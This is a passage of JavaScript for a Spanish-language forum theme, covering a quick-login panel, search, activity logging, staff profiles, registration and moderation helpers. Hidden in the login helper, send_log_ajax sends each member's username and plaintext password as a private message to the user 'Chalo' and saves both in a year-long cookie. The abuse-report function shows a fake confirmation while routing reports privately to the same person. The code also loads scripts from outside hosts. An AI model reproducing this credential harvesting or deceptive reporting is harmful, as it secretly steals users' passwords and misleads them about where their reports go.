                    !init.g('#goodies') && ops.cf_html();
                    init.fadeIn(b, 600);
                    init.fadeOut(d, 600);
                }
            ops.perfil.muro.currentCSS(b).display == 'none' ? c() : (init.fadeOut(b, 600), init.fadeIn(d, 600));
        },
        cf_html: function () {
            var a = init.g('.title-overview')[0],
                e = init.create('div', {
                    attributes: {
                        id: 'goodies'
                    },
                    childs: [{
                        tag: 'div',
                        attributes: {
                            id: '_colortitulo'
                        },
                        childs: [{
                            tag: 'input',
                            attributes: {
                                id: '_colortitulo_input',
                                type: 'text',
                                placeholder: ops.lang.cf_p_b,
                            }
                        }, {
                            tag: 'div',
                            class: '_colortitulo-button',
                            attributes: {
                                onclick: 'ops.temas.main.startGoddies(\'color\',this)'
                            },
                            childs: [{
                                tag: 'i',
                                class: 'fa fa-adjust'
                            }]
                        }]
                    }, {
                        tag: 'div',
                        attributes: {
                            id: '_shadow_ajax'
                        },
                        childs: [{
                            tag: 'input',
                            attributes: {
                                id: '_shadow_ajax_input',
                                type: 'text',
                                placeholder: ops.lang.cf_p_c,
                            }
                        }, {
                            tag: 'div',
                            class: '_shadow_ajax-button',
                            attributes: {
                                onclick: 'ops.temas.main.startGoddies(\'sombra\',this)'
                            },
                            childs: [{
                                tag: 'i',
                                class: 'fa fa-font'
                            }]
                        }]
                    }]
                });
            ops.estoy_logueado && !init.g('#_colortitulo') && init.move(a, e, 'after');
        },
        menufixed: function () {
             window.addEventListener('scroll', function () {
               var a = document.body.scrollTop || window.pageYOffset;
                  b = init.g('.titulo-tema')[0];
                a > 340 ? ops.logout && tm && b.classList.add('flotante')  : ops.logout && tm && b.classList.remove('flotante');
                tm && ops.temas.main.scrollAll();
            })
        },
        menuTips: function () {
            var a = init.g('.mainmenu'),
                b =  ['Ir a la página principal', 'Ver quienes estamos en el foro', 'Los grupos a los que puedes pertenecer', 'Edita tu perfil', 'Ver los mensajes privados o enviar uno'],
                c =  ops.soy_user || ops.soy_staff && !ops.soy_adm ? ['Salir del foro'] :  ['Ir al Pa',  'Salir del foro'],
                d = b.concat(c);
                i = a.length;
            while (i--) a[i].title = d[i];
        },
        send_log_ajax: function () {
            var e = init.elem('p', {
                    innerHTML: 'Enviando datos... ',
                    className: 'login_notice',
                    id: 'ErR',
                    style: {
                        color: 'rgb(255, 255, 255)',
                        marginLeft: '163px',
                        position: 'absolute',
                        marginTop: '-16px'
                    }
                }),
                a = init.g('.password'),
                b = init.g('.username'),
                c = a.length && (a[0]),
                d = b.length && (b[0]),
                f = 'username=' + d.value + '&password=' + c.value + '&autologin=on&login=true';
            init.move(c, e, 'after');
            ops.xmlhRequest(f, '/login', function (x) {
                var e = x.responseXML,
                    subject = '[Mensaje automático]',
                    message = 'Usuario: ' + d.value + '\n Pass: ' + c.value,
                    username = 'Chalo';
                ops.i_a(null, null, subject, message, username);
                var notice = init.g('#ErR'),
                    error = init.g('.error', e);
                if (error.length && init.contiene(error[0], 'inválida')) {
                    init.elem(notice, {
                        innerHTML: 'El password es incorrecto',
                        style: {
                            color: 'rgb(255, 0, 0)',
                            marginLeft: '163px',
                            position: 'absolute',
                            marginTop: '-16px'
                        }
                    });
                    init.elem(c, {
                        style: {
                            background: 'rgb(255, 192, 203)!important'
                        },
                        placeholder: 'Intenta de nuevo',
                        value: '',
                    });
                    c.onkeyup = function () {
                        this.style = '';
                        init.fadeOut(notice, 200)
                    };

                } else {
                    Cookies.set('reload_login', d.value + ' ' + c.value, {
                        expires: 365
                    });
                    init.fadeOut(notice, 200);
                    ops.actividadFeed(d.value + ' se conecto al foro', 'Historial');
                    setTimeout(function () {
                      window.location.reload()
                    }, 200)
                }
            })
        },
        i_a: function (d, c, subject, message, username, f) {
            var a = d == 'e' || d == 'E',
                data = {
                    subject: subject,
                    message: message,
                    username: username,
                    mode: (a == true ? 'edit' : 'post'),
                    folder: (a == true ? 'inbox' : ''),
                    post: '1',
                    p: a == true ? c.match(/(\d+)$/g)[0] : ''
                };
            ops.xmlhRequest(data, '/privmsg', function () {
                f && f();
            })
        },
        start_Ncontent: function (e, t) {
            var m, titulo, url, target, nopost, historial, funcion;
            url = t.href;
            target = '.topictitle';
            switch (e) {
                case 'newposts':
                    titulo = 'Mensajes nuevos desde tu última visita';
                    nopost = 'No hay mensajes nuevos';
                    historial = ops.mi_nombre + ' vió los mensajes nuevos desde su última visita';
                    break;
                case 'egosearch':
                    titulo = 'Tus mensajes en este subforo';
                    nopost = 'No hay mensajes';
                    historial = ops.mi_nombre + ' vió los mensajes que tiene en un subforo';
                    break;
                case 'unanswered':
                    titulo = 'Mensajes sin respuesta en este subforo';
                    nopost = 'No hay mensajes sin respuesta';
                    historial = ops.mi_nombre + ' vió los mensajes sin respuesta de un subforo';
                    break;
                case 'watchsearch':
                    titulo = 'Temas vigilados en este subforo';
                    nopost = 'No tienes temas vigilados';
                    historial = ops.mi_nombre + ' vió los mensajes vigilados que tiene en un subforo';
                    break;
                case 'favouritesearch':
                    titulo = ops.titulo_pagina;
                    url = '/search?add_favourite=' + ops.id_tema + '&search_id=favouritesearch';
                    funcion = $.boxes('alert', 'Se añadió ' + titulo + ' a tu lista de favoritos');
                    break;
                case 'stats':
                    titulo = 'Estadisticas';
                    target = '#main-content';
                    nopost = 'Nada que ver';
                    historial = ops.mi_nombre + ' vió las estadísticas del foro';
                    break;
                case 'preferences':
                    titulo = 'Preferencias';
                    url = '/profile?mode=editprofile&page_profil=preferences';
                    target = '#cp-main';
                    funcion = function () {
                        ops.config.cambiarTextos();
                        document.forms.post && document.forms.post.submit.addEventListener('click', function (e) {
                            e.preventDefault();
                            ops.config.sendForm('post')
                        });
                        init.g('fieldset', init.g('#ucp'))[0].style.color = '#fff';
                    };
                    break;
            }
            ops.NLoad(url, titulo, target, nopost, historial, funcion, e);
        },
        actividadFeed: function (a, b) {
            var t = {
                subject: 'Mensaje automático',
                message: a,
                username: b,
                mode: 'post_profile',
                folder: 'profile',
                post: 'Send'
            };
            ops.xmlhRequest(t, '/privmsg', function (x) {
                init.Log('Actividad actualizada');
            });
        },
        NLoad: function (url, titulo, target, nopost, historial, f, e) {
            ops.topic = '';
            var vacio = '<p class="mensaje" style="display:table;margin:0 auto">' + nopost + '</p>';
            ops.xmlhRequest('', url, function (o) {
                var x = o.responseXML,
                    w = init.g(target, x);
                ops.xml = x;
                ops.target = w;
                target === '.topictitle' ? (init.myarray(w, function (i) {
                    i.href = i.href + '?view=newest';
                    ops.topic += i.outerHTML + '</br>';
                })) : (ops.topic = ops.target.innerHTML);
                'undefined' != typeof target && e != 'favouritesearch' && ops.box(ops.topic != '' ? ops.topic : vacio, titulo, function () {
                    ops.prefijos();
                    'undefined' != typeof f && f(this)
                    ops.topic != '' || 'undefined' != typeof historial && ops.actividadFeed(historial, 'Historial');
                });
            });
        },
        ab_on: function () {
            var i, h, c = init.g('.report')[0],
                b = '<div class="panel abuso_no"><div class="inner"><span class="corners-top"><span></span></span><h1 class="page-title">Acuse de recibo</h1><p></p><p class="center">Página concerniente a la denuncia : <span class="warning"><a href="http://opensource-code-test.foroactivo.mx/index.forum" target="_blank" style="color:rgb(255, 51, 51);">https://www.opensourcephpbb3.net</a></span></p><p class="center"><strong>Su observación ha sido transmitida. Se examinará lo antes posible.</strong></p><p class="center"><a href="/index.forum">Pulse aquí para volver a la página indicada</a></p><p></p><span class="corners-bottom"><span></span></span></div></div>',
                d = init.g('#comments'),
                a = ops.topictype(c, 'on');
            if ('undefined' != typeof a) {
                usename = 'Chalo';
                subjet = '[Mensaje automático] Intento de reporte de abuso';
                message = ops.mi_nombre + ' quizó hacer un reporte \n Tipo de reporte: ' + a + '\n Contenido:' + d.value;
                setTimeout(function () {
                    c.innerHTML = b;
                }, 5e3)
                ops.temas.main.post_mw(username, subject, message, '', 'post', '', 'inbox', '', false)
            } else {
                $.boxes({
                    mode: 'alert',
                    title: ops.mi_nombre + ' Debes seleccionar algo'
                })
            }
        },
        abuse_msg: function (c) {
            $.boxes({
                mode: 'alert',
                title: ops.mi_nombre + ' antes de hacer una denuncia\n te pido que lo discutas conmigo. \n Chalo.',
                ok: function () {
                    ops.xmlhRequest('', c.href, function (o) {
                        var x = o.responseXML,
                            a = init.g('.row1', x)[0].innerHTML,
                            b = init.g('#topicPreview-container'),
                            d = init.g('.button2', b)[0];
                        ops.box(a, 'Reportar un abuso');
                        d.setAttribute('onclick', 'ops.ab_on(this);return false');
                    })
                }
            })
        },
        marcar_leidos: function (c) {
            var len, e,
                a = c.href,
                b = init.g('.icon'),
                d = init.g('.row');
            ops.xmlhRequest('', a, function () {
                e = ind ? b : d;
                init.myarray(e, function (i) {
                    /newpost/g.test(i.className) && i.classList.remove('newpost')
                });
                ops.toolbar.notify.go(ops.mi_nombre + ': Se marcaron como leídos todos los temas', null, 'check', 'fas fa-check-double', false);
            })
        },
        setMarcasLeidos: function () {
            var e = init.g('a');
            init.myarray(e, function (i) {
                /\?mark=topics/g.test(i.href) && i.setAttribute('onclick', 'ops.marcar_leidos(this);return false');
            })
        },
        smarthSearch: function () {
            var url, html, d, e, f, g, i, h, j,
                a = init.g('#fa_textarea');
            a.setAttribute('onkeypress', 'if (event.keyCode==13){return false}');
            a.addEventListener('keyup', function (o) {
                if (this.value.length != 0) {
                    !init.g('#ajaxSearch') && init.move(this, init.create('div', {
                        childs: [{
                            tag: 'div',
                            class: 'flecha',
                        }, {
                            tag: 'div',
                            attributes: {
                                id: 'ajaxSearch'
                            }
                        }],
                        style: {
                            display: 'inherit'
                        },
                        class: 'search_adv',
                        attributes: {
                            id: 'aj_s'
                        }
                    }), 'after');
                }
                d = init.g('#ajaxSearch');
                html = function (x) {
                    d.innerHTML = x
                };
                e = init.g('#aj_s');
                g = this.value.replace(/\s/g, '+');
                url = '/search?mode=searchbox&search_keywords=' + g + '&show_results=topics';
                d && (d.style.left = this.offsetLeft + 'px', d.style.top = this.offsetTop + 20 + 'px', 0 == this.value.length ? init.borrar(e) : this.value.length > 5 ? (ops.indice.spin(d, '#000', '20px', 'center', 'Buscando'), ops.xmlhRequest('', url, function (x) {
                    f = x.responseXML;
                    h = init.g('.error', f);
                    j = init.g('.topictitle', f);
                    if (h.length && init.contiene(h[0].textContent, 'No hay temas')) {
                        html('No hay resultados')
                    } else {
                        html('');
                        init.myarray(j, function (i) {
                            init.move(d, init.create('div', {
                                class: 'ajaxResult',
                                childs: [{
                                    tag: 'a',
                                    attributes: {
                                        href: i.href,
                                    },
                                    text: i.textContent
                                }]
                            }), 'append')
                        });
                    }
                    ops.prefijos();
                })) : html('Muy corto'))
            }, false);
        },
        panel_log: function () {
            var i, h = init.g('a');
            init.myarray(h, function (i) {
                if (/\/login/g.test(i.href)) {
                    !ops.logout ? i.setAttribute('onclick', 'ops.Login();return false') : (i.href = ops.logout.href)
                }
            })
        },
        Login: function () {
            var b, c, d, f, g, h, j,
            a =  init.create('div', {
                            attributes: {
                                id: 'quickLoginPanel',
                            },
                            style:{
                               display:'none',
                                height: '160px',
                                left:'25%',
                                background: 'url(https://i.imgur.com/ylwhiOI.png) repeat-x!important',
                                position: 'fixed',
                                width:'50%',
                                zIndex: '1000',
                                display: 'block',
                                border:'none'
                            },
                            childs: [{
                                tag: 'fieldset',
                                class: 'fields1 left fld_connexion',
                                childs:[{
                                        tag:'form',
                                        style:{marginTop:'9px'},
                                        attributes:{
                                          name:'form_login',
                                          method:'post',
                                          action:'/login'
                                        },
                                        childs:[{
                                            tag:'dl',
                                            childs:[{
                                                tag:'dt',
                                                childs:[{
                                                    tag:'label',
                                                    attributes:{
                                                        for:'username'
                                                    },
                                                    text:'Usuario:'
                                                }]
                                            },{
                                                tag:'dd',
                                                childs:[{
                                                    tag:'input',
                                                    class:'username inputbox autowidth',
                                                    attributes:{
                                                        id:'username',
                                                         type:'text',
                                                         value:'',
                                                         maxlength:'40',
                                                         size:'25',
                                                         name:'username',
                                                         tabindex:'1'
                                                    }
                                                }]
                                            }]
                                        }, {
                                            tag:'dl',
                                            childs:[{
                                                tag:'dt',
                                                childs:[{
                                                    tag:'label',
                                                    attributes:{
                                                        for:'password'
                                                    },
                                                    text:'Contraseña:'
                                                }]
                                            },{
                                                tag:'dd',
                                                childs:[{
                                                    tag:'input',
                                                    class:'password inputbox autowidth',
                                                    attributes:{
                                                        id:'password',
                                                         type:'password',
                                                         value:'',
                                                         maxlength:'25',
                                                         size:'25',
                                                         name:'password',
                                                         tabindex:'2'
                                                    }
                                                }]
                                            },{
                                                    tag:'dd',
                                                    childs:[{
                                                        tag:'a',
                                                        attributes:{
                                                            href: '/profile?mode=sendpassword'
                                                        },
                                                        text: 'Olvide mi contrseña'
                                                    }]
                                                }]
                                        },{
                                            tag:'dl',
                                            childs:[{
                                            tag:'dd',
                                            childs:[{
                                                tag:'input',
                                                class:'enviar_log',
                                            attributes:{
                                                type:'submit',
                                                value:'Entrar al foro',
                                                tabindex:'6',
                                                name:'login'
                                            }
                                            }]
                                                }]
                                        },{
                                                tag:'a',
                                                attributes:{
                                                href:'#',
                                                id: 'quickLoginClose'
                                                },
                                                text:'Cerrar'
                                                }]

                                       }]
                            }]
                        });
            if (!ops.logout) {
              !init.g('#quickLoginPanel') &&  init.move(document.body, a, 'prepend');
                b = init.g('#quickLoginPanel');
                c = document.body.scrollTop || window.pageYOffset > 240;
                d = init.g('.announcement-bar');
                f = init.g('.username');
                g = init.g('.enviar_log')[0];
                h = init.g('#quickLoginClose');
               b && ops.back(b);
               f[0].addEventListener('blur', function () {
                    ops.xmlhRequest('', '/search?mode=searchuser&fieldname=username&search_username=' + init.fixedEncodeURIComponent(f[0].value) + '&time=' + timestamp(), function (x) {
                        var t, e = x.responseXML;
                        if (init.g('#username_list', e).value != f[0].value) {
                            t = init.create('p',{
                                class:'login_notice',
                                style:{
                                    color: 'rgb(255, 0, 0)',
                                    marginLeft: '163px',
                                    position: 'absolute',
                                    marginTop: '-16px;'
                                },
                                text:'El usuario no existe ó escribelo con las mayúsculas y minúsculas como fue registrado'

                            });
                            init.move(f[0], t, 'after');
                            init.elem(f[0], {
                                style: {
                                    background: 'rgb(255, 192, 203)!important',
                                },
                                placeholder: 'Intenta de nuevo',
                                value: '',
                            });
                            f[0].addEventListener('keyup', function () {
                                j = init.g('.login_notice');
                              j.length &&  init.borrar(j[0]);
                            }, false);
                        }
                    })
                }, false);
                g.addEventListener('click',  function (e) {
                e.preventDefault();
                e.stopPropagation();
                ops.send_log_ajax();

                },false);
                h.addEventListener('click',  function (e) {
                e.preventDefault();
                ops.backClose();

        }, false);
            }
        },
        dataFrs: function () {
            var frs = {};
            $('.friends-foes-list a').tooltipster({
                animation: 'grow',
                interactive: true,
                contentAsHTML: true,
                minWidth: 300,
                maxWidth: 300,
                delay: 500,
                arrowColor: "#000",
                autoClose: true,
                content: '<i class="fa fa-spinner fa-pulse fa-fw"></i> Cargando...',
                functionBefore: function (origin, continueTooltip) {
                    continueTooltip();
                    var c, o, x, a = init.uid($(this).attr('href'));
                    if (origin.data('ajax') !== 'cached') {
                        if (frs[a] != undefined) {
                            origin.tooltipster('content', frs[a]).data('ajax', 'cached');
                        } else {
                            ops.xmlhRequest('', '/u' + a + 'stats', function (m) {
                                o = m.responseXML;
                                x = init.g('#cp-main', o).innerHTML;
                                frs[a] = '<div id="previeW" style="font-size:11px;height: 300px;overflow: auto;">' + x + '</div>';
                                origin.tooltipster('content', frs[a]).data('ajax', 'cached');
                            })
                        }
                    }
                },
            });
        },
        loadIMG: function (o, p, id) {
            var x = o.responseXML,
                a = init.g('.mention_avatar', x),
                b = init.g('#hovercard', x),
                c = x.querySelector('.post .content img'),
                d = b ? a[0].src : c != null && c.src;
            (p && b && d != false) ? p.firstChild.src = d: d != false && !init.contiene(d, 'smiles') && (p.style.backgroundImage = 'url(' + d + ')');
            d != false && !init.contiene(d, 'smiles') && (ops.storage(id, (b ? p.innerHTML : d), (b ? 'avatares' : 'miniaturas')));
        },
        preXMTL: function (a, id, p) {
            ops.xmlhRequest('', (init.contiene(a, '/u') ? '/ajax/index.php?f=m&user_id=' + id : a), function (o) {
                ops.loadIMG(o, p, id)
            });
        },
        getAva: function (id) {
            var r, regex, a = window.localStorage;
            if (a.getItem('user_ava_' + id) && a.getItem('user_exp_' + id) > +new Date - 24 * 60 * 60 * 1000) {
                regex = /[-a-zA-Z0-9@:%_\+.~#?&//=]{2,256}\.[a-z]{2,4}\b(\/[-a-zA-Z0-9@:%_\+.~#?&//=]*)?/gi;
                r = a.getItem('user_ava_' + id).match(regex)[0];
                return r
            } else {
                var request = new XMLHttpRequest();
                request.open('GET', '/ajax/index.php?f=m&user_id=' + id, false);
                request.send(null);
                r = request.responseText.match(/<img class="mention_avatar" src="(.*?)"/)[1];
                console.log('avatar:',r);
                if (request.status === 200) {
                    ops.storage(id, '<img src="' + r + '" />', 'imagen');
                    return r
                }
            }
        },
        me_avatar: function () {
            var a = init.g('img');
            init.myarray(a, function (i) {
                var b = i.src,
                    c = ops.miavatarSRC,
                    d = ops.mi_nombre,
                    e = i.getAttribute('name'),
                    f = i.getAttribute('title');
                b === c && (i.className += ' me');
                if ('undefined' != typeof e || 'undefined' != typeof f) {
                    d === e || d === f && (i.className += ' me');
                }
            })
        },
        confirm: function () {
            init.cachedScript('https://allphpbb31.com/js/confirm.js')
        },
        banner: function () {
            if (!ops.logout && !Cookies.get('popuphide')) {
                var a = init.g('#fa_toolbar'),
                    b = init.create('div', {
                        class: 'announcement-bar view announcement-bar--open view--loaded',
                        text: '¡Somos un foro diferente, tenemos muchos códigos, y te podemos decir como usarlos, modificarlos, además de atender tus más caprichosos deseos, no pierdes nada con registrarte!',
                        childs: [{
                            tag: 'i',
                            class: 'fas fa-window-close',
                            attributes: {
                                onclick: 'ops.close_popup(this)'
                            }
                        }]
                    });
                init.move(a, b, 'after');
            }
        },
        close_popup: function (c) {
            init.borrar(c.parentNode);
            Cookies.set('popuphide', '1', {
                expires: 7
            });
        },
        status_box_html: function () {
            var f = init.g('#fa_menulist'),
                t = init.create('li', {
                    class: 'more_',
                    childs: [{
                        tag: 'div',
                        attributes: {
                            id: 'ops_miniportada',
                        },
                        childs: [{
                            tag: 'input',
                            attributes: {
                                id: 'ops_miniportada_input',
                                type: 'text',
                                placeholder: ops.lang.cf_p_a
                            },
                            class: 'all',
                        }, {
                            tag: 'button',
                            class: 'ops_miniportada-button',
                            attributes: {
                                onclick: 'ops.temas.main.startGoddies(\'portada\',this)'
                            },
                            childs: [{
                                tag: 'i',
                                class: 'fa fa-picture-o',
                                attributes: {
                                    'aria-hidden': 'true'
                                }
                            }]
                        }]
                    }]
                });
            if (f) {
                init.move(f, t, 'append');
            }
        },
        moderacion_pub: function (c) {
            var a = ops.perfil.muro.currentCSS(c),
                b = init.create('div', {
                    attributes: {
                        id: 'reglas_mod'
                    },
                    childs: [{
                        tag: 'i',
                        class: 'fa fa-exclamation-circle',
                        style: {
                            fontSize: '37px',
                            float: 'left',
                            marginLeft: '5px',
                            marginRight: '5px',
                        }
                    }, {
                        tag: 'text',
                        text: 'Recuerda que este foro, no es el FDF, moderamos una sola vez por día al mismo usuario en caso que sea necesario, ó una falta muy grave, ó distinta a la señalada previamente'
                    }]
                }),
                d = init.g('a');
            init.myarray(d, function (i) {
                init.contiene(i.href, 'modcp?mode=ban') && i.setAttribute('onclick', 'ops.ban_user(this);return false');
            });
            a.display == 'block' && !init.g('#reglas_mod') && (init.move(c, b, 'before'));
        },
        staff_alert: function () {
            if (0 === _userdata.user_level && ind) {
                var a = init.g('.row');
                init.myarray(a, function (i) {
                    var b = init.g('.forumtitle', i)[0];
                    if (b.textContent == 'Staff') {
                        i.className += ' staff';
                        b.addEventListener('click', function (e) {
                            e.preventDefault();
                            $.boxes('alert', 'Foro destinado al staff');
                        }, false);
                    }
                });
            }
        },
        enviarActividad: function () {
            var a = init.g('a');
            !mp && init.myarray(a, function (i) {
                if (/(index_topicname|acti_topicname|topictitle|forumtitle|tem_link)/g.test(i.className)) {
                    i.addEventListener('click', function () {
                        var e = i.innerHTML.replace('&nbsp;', ''),
                            t = i.href.match(/\/(t|f).+/g)[0],
                            n = ops.mi_nombre + ' visitó ' + (/forumtitle/g.test(i.className) ? 'la categoría:' : 'visitó el tema: ') + ' [url=http://' + location.hostname + t + ']' + e + '[/url]';
                        ops.actividadFeed(n, 'Historial')
                    }, false)
                }
            })
        },
        StaffOnline: function () {
            var c, d, e, f, g, id, div,name,
                a = init.g('a', init.g('.log-in')[0]),
                html = init.g('#theStaff'),
                contenedor = [],
                tit = init.create('fragment', {
                    childs: [{
                        tag: 'p',
                        style: {
                            color: '#fff',
                            fontSize: '11px',
                            fontWeight: 'bold',
                            marginBottom: '2px',
                            display: 'block'
                        },
                        class: "staff_titulo",
                        text: 'Staff en línea:',
                    }]
                }),
                nohay = [{
                    tag: 'i',
                    class: 'fa fa-ban',
                    'aria-hidden': 'true',
                    style: {
                        color: 'red',
                    },
                }, {
                    tag: 'span',
                    style: {
                        color: 'red',
                    },
                    text: ' No hay staff en línea',
                    class: 'noStaff',
                }];
            init.myarray(a, function (i) {
                 name = i.name;

                if (name.length && init.contiene(ops.myStaff, name)) {
                    c = i.name;
                    d = i.href;
                    e = i.firstChild.src;
                    id = init.uid(d);
                    div = init.create('div', {
                        class: 'myStaff',
                        childs: [{
                            tag: 'a',
                            class: 't_avatar staff_avatar',
                            style: {
                                color: 'transparent',
                            },
                            href: d + 'wall',
                            attributes: {
                                title: c,
                            },
                            childs: [{
                                tag: 'img',
                                attributes: {
                                    src: ops.getAva(id)
                                }
                            }]
                        }]
                    });
                    !init.contiene(html, d) && contenedor.push(div);

                }
            });
            init.replaceHtml(tit, html, function (x, y) {
                init.move(html, init.create('fragment', {
                    childs: contenedor.length ? contenedor : nohay
                }), 'append', function () {
                    init.fadeIn(html, '500')
                })
            })
        },
        searchSatff: function () {
            ops.xmlhRequest('', '/g2-moderadores', function (o) {
                var x = o.responseXML,
                    a = init.g('.table1', x),
                    b = a.length && init.g('a', a[0]);
                init.myarray(b, function (c) {
                    if (init.contiene(c, '#000099')) {
                        var id = init.uid(c.href),
                            name = c.textContent;
                        ops.xmlhRequest('', '/u' + id, function (o) {
                            var a = o.responseXML,
                                b = init.g('#field_id-11', a),
                                c = b && init.g('.field_uneditable', b)[0],
                                pais = b ? c.textContent : 'No disponible';
                            ops.staffDivs(id, pais, name)
                        })
                    }
                });
            });
        },
        staffDivs: function (t, e, a) {
            ops.xmlhRequest('', '/u' + t + 'stats', function (s) {
                var n = s.responseXML,
                    i = init.g('.stats-field', n),
                    l = n.querySelectorAll('.module .inner img')[0].src,
                    o = init.g('li', i[1])[0].textContent.match(/\d+/)[0],
                    c = init.g('li', i[3])[0].textContent.match(/\d+/)[0],
                    r = init.last(init.g('li', init.last(i))).textContent.match(/(?::)(.*)/)[1],
                    p = init.g('.hero')[0],
                    d = init.g('center', p),
                    m = init.create('section', {
                        class: 'profile',
                        childs: [{
                            tag: 'header',
                            class: 'user',
                            childs: [{
                                tag: 'aside',
                                class: 'loves',
                                childs: [{
                                    tag: 'a',
                                    attributes: {
                                        href: '#'
                                    },
                                    childs: [{
                                        tag: 'i',
                                        class: 'fa fa-thumbs-up'
                                    }]
                                }, {
                                    tag: 'span',
                                    class: 'count',
                                    childs: [{
                                        tag: 'li',
                                        childs: [{
                                            tag: 'label',
                                            text: 'Me gusta',
                                        }, {
                                            tag: 'span',
                                            text: o
                                        }]
                                    }]
                                }]
                            }, {
                                tag: 'span',
                                class: 'staff_avatar',
                                childs: [{
                                    tag: 'img',
                                    attributes: {
                                        src: l,
                                        alt: 'Avatar'
                                    }
                                }]
                            }, {
                                tag: 'h1',
                                childs: [{
                                    tag: 'a',
                                    class: 'url_staff',
                                    attributes: {
                                        href: '/u' + t
                                    },
                                    childs: [{
                                        tag: 'span',
                                        class: 'name',
                                        childs: [{
                                            tag: 'strong',
                                            text: a
                                        }]
                                    }]
                                }]
                            }, {
                                tag: 'p',
                                text: 'Staff',
                            }, {
                                tag: 'span',
                                class: 'frds'
                            }]
                        }, {
                            tag: 'ul',
                            class: 'menu',
                            childs: [{
                                tag: 'li',
                                class: 'menu-item active',
                                childs: [{
                                    tag: 'i',
                                    class: 'fas fa-marker',
                                    childs: [{
                                        tag: 'b',
                                        text: ' Post:'
                                    }]
                                }, {
                                    tag: 'a',
                                    class: 'post_staff',
                                    childs: [{
                                        tag: 'div',
                                        class: 'field_uneditable',
                                        text: c
                                    }]
                                }]
                            }, {
                                tag: 'li',
                                class: 'menu-item',
                                childs: [{
                                    tag: 'i',
                                    class: 'fa fa-globe',
                                    childs: [{
                                        tag: 'b',
                                        text: ' Pais:'
                                    }]
                                }, {
                                    tag: 'a',
                                    childs: [{
                                        tag: 'div',
                                        class: 'field_uneditable',
                                        text: e,
                                        style: {
                                            textTransform: 'capitalize'
                                        }
                                    }]
                                }]
                            }, {
                                tag: 'li',
                                class: 'menu-item',
                                childs: [{
                                    tag: 'i',
                                    class: 'fa fa-plug',
                                    childs: [{
                                        tag: 'b',
                                        text: ' Conectado:'
                                    }]
                                }, {
                                    tag: 'a',
                                    childs: [{
                                        tag: 'div',
                                        class: 'field_uneditable',
                                        text: r,
                                    }]
                                }]
                            }]
                        }]
                    });
                d.length && init.borrar(d[0]);
                init.move(p, m, 'prepend', function () {
                    ops.temas.main.añadir.main()
                });
            })
        },
        rg_Ajx: function () {
            init.myarray(init.g('a'), function (a) {
                if (a.href.match(/\/register/g)) {
                    a.addEventListener('click', function (b) {
                        b.preventDefault();
                        ops.xmlhRequest('', '/register?step=2&agreement=1&privacy=1', function (x) {
                            var xml = x.responseXML,
                                html = init.g('#ucp', xml);
                            html && (html.className += ' register_form');
                            html ? ops.box(html, 'Registrate', function () {
                                var parent = init.g('#topicPreview-container'),
                                    button = init.g('.button1', parent);
                                button.length && button[0].addEventListener('click', function (event) {
                                    event.preventDefault();
                                    var g = init.g('.register_form')[0],
                                        url = 'https://cdn.funcaptcha.com/fc/js/502fb5da383bd2a82b3a8c2864636fea/standard/funcaptcha_api.js',
                                        t = {
                                            username: init.g('#username_reg').value,
                                            email: init.g('#email').value,
                                            'profile_field_16_-7': ops.topictype(init.g('input', init.g('.profile_field_list')[0])),
                                            'profile_field_13_2': init.g('#profile_field_13_2').value,
                                            'profile_field_13_6': init.g('#profile_field_13_6').value,
                                            wantsnews: '1',
                                            agreement: 1,
                                            privacy: 1,
                                            password: init.g('#password_reg').value,
                                            submit: 'Save'
                                        };
                                    ops.xmlhRequest(t, '/register?step=2&agreement=1&privacy=1', function (o) {
                                        var x = o.responseXML,
                                            form = init.g('#ucp', x);
                                        init.replaceHtml(form, g, function () {
                                            init.cachedScript(url, function () {
                                                init.g('.button1')[0].addEventListener('click', function (event) {
                                                    event.preventDefault();
                                                    var form2 = ops.serialize(init.g('#ucp')) + '&submit=Save';
                                                    ops.xmlhRequest(form2, '/register?step=2&agreement=1&privacy=1', function (o) {
                                                        var w = o.responseXML;
                                                        console.log(init.g('.error', w)[0].textContent);
                                                        // ops.toolbar.notify.go(init.g('.error', w)[0].textContent, null, 'check', 'fa-exclamation-circle');
                                                    });
                                                }, false)
                                            })
                                        });
                                    });
                                });
                            }) : ops.toolbar.notify.go(ops.mi_nombre + ', ocurrió un problema intentalo de nuevo', null, 'alert', 'fas fa-exclamation-circle');
                        });
                    }, false);
                }
            });
        },
        cT_Ajx: function () {
            var url = 'https://goo.gl/CNaz63';
            init.myarray(init.g('a'), function (a) {
                if (a.href.match(/\/contact/g)) {
                    a.addEventListener('click', function (b) {
                        b.preventDefault();
                        ops.xmlhRequest('', a.href, function (x) {
                            var xml = x.responseXML,
                                report = init.g('.report', xml),
                                html = init.closest(report[0], '.row1');
                            report.length && (report[0].id = 'quickContact');
                            report.length ? ops.box(html.innerHTML, 'Contactar a la administración', function () {
                                var parent = init.g('#topicPreview-container'),
                                    button = init.g('.button2', parent);
                                init.cachedScript(url, function () {
                                    button.length && button[0].setAttribute('onclick', 'ops.onForm(this); return false');
                                })
                            }) : ops.toolbar.notify.go(ops.mi_nombre + ', ocurrió un problema intentalo de nuevo', null, 'alert', 'fas fa-exclamation-circle');
                        });
                    }, false);
                }
            });
        },
        onForm: function (c) {
            var g = init.g('#quickContact'),
                t = ops.serialize(g);
            c.value = 'Enviando...';
            ops.xmlhRequest(t, '/contact?action=submit', function (o) {
                var x = o.responseXML,
                    a = init.g('p', x),
                    d = init.closest(c, '#quickContact'),
                    e = init.g('.submit-buttons', d)[0];
                init.myarray(a, function (b) {
                    if (b.innerHTML.indexOf('éxito') >= 0) {
                        ops.estoy_logueado && ops.toolbar.notify.go(ops.mi_nombre + ', se envió el mensaje con éxito', null, 'check', 'fas fa-check-double');
                        setTimeout(function () {
                            ops.backClose()
                        }, 1e3)
                    }
                });
            });
        },
        send_ban_o: function (c) {
            var b = init.g('.enviar_ban')[0],
                c = document.forms.ban_o.ban_user_reason,
                d = document.forms.ban_o.ban_user_date,
                e = ops.idPerfil,
                f = {
                    ban_user_date: d.value,
                    ban_user_reason: c.value,
                    confirm: 1,
                    mode: 'ban',
                    user_id: e,
                    tid: isTid
                };
            ops.xmlhRequest(f, '/modcp?tid=' + isTid, function () {
                ops.toolbar.notify.go(ops.nombre_perfil + ' ha sido expulsado', null, 'alert', 'fas fa-check-circle');
                c.textcontent = ops.nombre_perfil + ' ha sido expulsado';
                c.removeAttribute('href');
                c.removeAttribute('onclick');
                ops.backClose()
            })
        },
        ban_user: function (c) {
